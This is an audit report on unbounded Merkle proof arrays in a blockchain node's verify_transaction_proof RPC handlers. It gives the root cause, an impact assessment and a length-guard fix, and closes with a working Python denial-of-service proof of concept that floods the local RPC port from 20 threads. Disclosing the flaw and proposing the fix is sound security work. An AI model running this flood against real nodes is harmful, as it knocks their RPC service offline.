Audit Report

## Title
Unbounded Merkle Proof Iteration in `verify_transaction_proof` and `verify_transaction_and_witness_proof` Enables RPC CPU/Memory DoS - (File: `rpc/src/module/chain.rs`)

## Summary

Both `verify_transaction_proof` and `verify_transaction_and_witness_proof` accept caller-supplied `lemmas` and `indices` arrays with no length validation before unconditionally collecting them into `Vec`s and passing them to `MerkleProof::new`. The `.collect()` calls perform O(N) memory allocation regardless of proof validity. If `root` is reached, each merge invokes a full blake2b hash via `MergeByte32::merge`. The only constraint is the 10 MiB HTTP body limit, permitting ~149,000 lemmas per call. This constitutes a local RPC API DoS.

## Finding Description

**Root cause — no pre-check on proof array sizes:**

In `verify_transaction_proof` (L1948–1961), the handler unconditionally collects all caller-supplied `lemmas` and `indices` into `Vec`s before any structural validation:

```rust
let merkle_proof = MerkleProof::new(
    tx_proof.proof.indices.into_iter().map(|index| index.value()).collect(),
    tx_proof.proof.lemmas.into_iter().map(|lemma| lemma.into()).collect(),
);
CBMT::retrieve_leaves(block.tx_hashes(), &merkle_proof)
    .and_then(|tx_hashes| merkle_proof.root(&tx_hashes) ...)
```

The `.collect()` calls at L1953–1960 are unconditional — they execute before `retrieve_leaves` is called and regardless of whether the proof is structurally valid. With ~149,000 lemmas × 32 bytes each, this is ~4.8 MB of allocation per call.

The `MerkleProof` JSON type has no declared size limits on either field:

```rust
pub struct MerkleProof {
    pub indices: Vec<Uint32>,
    pub lemmas: Vec<H256>,
}
```

Each merge in `root` allocates a new blake2b context and performs a full hash:

```rust
fn merge(left: &Self::Item, right: &Self::Item) -> Self::Item {
    let mut blake2b = new_blake2b();
    blake2b.update(left.as_slice());
    blake2b.update(right.as_slice());
    blake2b.finalize(&mut ret);
```

`verify_transaction_and_witness_proof` (L2016–2043) constructs **two** such unbounded `MerkleProof` objects and calls `retrieve_leaves` + `root` on each.

**Existing guards and their insufficiency:**

The only size constraint is `max_request_body_size = 10485760` (10 MiB). There is no per-call lemma count limit, no per-IP rate limit, and no cycle/time budget. A grep for `rate_limit`, `throttle`, `max_lemmas`, or `lemmas.*len` returns no results in the codebase.

**Note on `retrieve_leaves` behavior:** The `merkle_cbt` crate is an external dependency not vendored in this repo. Whether `retrieve_leaves` short-circuits before `root` is called for structurally invalid proofs could not be confirmed. However, the `.collect()` calls are unconditional and constitute O(N) memory allocation work regardless of any early return in `retrieve_leaves`.

## Impact Explanation

Saturating the RPC thread pool with concurrent crafted calls makes the node's RPC service unresponsive. This maps to **"Note (0–500 points). Any local RPC API crash"** under the allowed impact scope. The default configuration binds to `127.0.0.1:8114`, so the impact is local by default. The attempt in the report to escalate to "High" for publicly-exposed RPC nodes is not supported — exposing the RPC publicly is explicitly warned against in the default config and constitutes a non-default operator choice, not a default attack surface.

## Likelihood Explanation

By default, `listen_address = "127.0.0.1:8114"` restricts the RPC to localhost. Exploitation requires local access to the machine running the node. No authentication is required once local access is obtained. No valid block hash is strictly required — any block hash that resolves in the node's store will trigger the allocation path. The attack is trivially repeatable and requires no special knowledge.

## Recommendation

Add a length guard at the entry point of both handlers before any computation. A valid CBMT proof for a block with at most `MAX_BLOCK_PROPOSALS_LIMIT` transactions requires at most `ceil(log2(N))` lemmas:

```rust
fn verify_transaction_proof(&self, tx_proof: TransactionProof) -> Result<Vec<H256>> {
    const MAX_PROOF_LEMMAS: usize = 32; // ceil(log2(max block txs))
    if tx_proof.proof.lemmas.len() > MAX_PROOF_LEMMAS
        || tx_proof.proof.indices.len() > MAX_PROOF_LEMMAS
    {
        return Err(RPCError::invalid_params("proof exceeds maximum size"));
    }
    // ... existing logic
}
```

Apply the same guard to both `transactions_proof` and `witnesses_proof` in `verify_transaction_and_witness_proof`.

## Proof of Concept

```python
import json, requests, threading

block_hash = "0x7978ec7ce5b507cfb52e149e36b1a23f6062ed150503c85bbf825da3599095ed"
lemmas = ["0x" + "aa" * 32] * 149_000

payload = {
    "jsonrpc": "2.0",
    "method": "verify_transaction_proof",
    "params": [{
        "block_hash": block_hash,
        "witnesses_root": "0x" + "00" * 32,
        "proof": {"indices": ["0x0"], "lemmas": lemmas}
    }],
    "id": 1
}

def attack():
    requests.post("http://localhost:8114", json=payload)

threads = [threading.Thread(target=attack) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```
